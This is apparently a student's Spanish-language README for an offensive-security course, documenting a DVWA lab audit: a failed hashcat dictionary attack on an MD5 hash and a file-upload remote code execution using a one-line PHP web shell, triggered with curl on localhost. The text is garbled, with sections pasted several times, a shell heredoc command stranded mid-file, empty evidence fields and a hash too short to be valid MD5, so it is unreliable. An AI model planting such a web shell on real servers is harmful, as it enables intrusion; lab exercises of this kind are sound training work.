# Proyecto Auditoría DVWA - ICV
**Alumno:** Sam Esparza Morga | **Módulo:** Ciberseguridad Ofensiva

Laboratorio de auditoría en entorno controlado DVWA sobre Kali Linux.

### Fase 6 - Cracking de Hashes
- **Hash:** `00946edfcb82a7d792d6ba2533963c` (MD5)
- **Tool:** hashcat 7.1.2 + rockyou.txt (14M)
- **Comando:** `hashcat -m 0 -a 0 hash.txt rockyou.txt`
- **Resultado:** Status Exhausted (0/1) - Contraseña fuerte, fuera de diccionario.

### Fase 7 - File Upload RCE
- **Vuln:** Subida sin validación en DVWA Low
- **Payload:** `shell.php` con `<?php system($_GET["cmd"]);?>`
- **Evidencia:**
cat > README.md << 'EOF'
# Proyecto Auditoría DVWA - ICV
**Alumno:** Sam Esparza Morga | **Módulo:** Ciberseguridad Ofensiva

Laboratorio de auditoría en entorno controlado DVWA sobre Kali Linux.

### Fase 6 - Cracking de Hashes
- **Hash:** `00946edfcb82a7d792d6ba2533963c` (MD5)
- **Tool:** hashcat 7.1.2 + rockyou.txt (14M)
- **Comando:** `hashcat -m 0 -a 0 hash.txt rockyou.txt`
- **Resultado:** Status Exhausted (0/1) - Contraseña fuerte, fuera de diccionario.

### Fase 7 - File Upload RCE
- **Vuln:** Subida sin validación en DVWA Low
- **Payload:** `shell.php` con `<?php system($_GET["cmd"]);?>`
- **Evidencia:**
# Proyecto Auditoría ICV - Sam Esparza
Auditoría de seguridad a DVWA - Fases 1 a 8

## Fase 6 - Cracking Hash
- Hash: 00946edfcb82a7d792d6ba2533963c (MD5)
- Herramienta: hashcat 7.1.2 + rockyou.txt (14M)
- Resultado: Exhausted 0/1 - Contraseña fuerte, no encontrada en diccionario
- Evidencia: evidencias/fase6-hash-cracking/

## Fase 7 - File Upload RCE
- Archivo: shell.php `<?php system($_GET["cmd"]); ?>`
- Ruta: /var/www/html/DVWA/hackable/uploads/shell.php
- Comando: curl http://127.0.0.1/DVWA/hackable/uploads/shell.php?cmd=id
- Resultado: uid=33(www-data) gid=33(www-data) - Ejecución remota exitosa
- Evidencia: evidencias/fase7-file-upload/

## Conclusión
Se demostró hash resistente y vulnerabilidad crítica de File Upload que permite RCE como www-data.
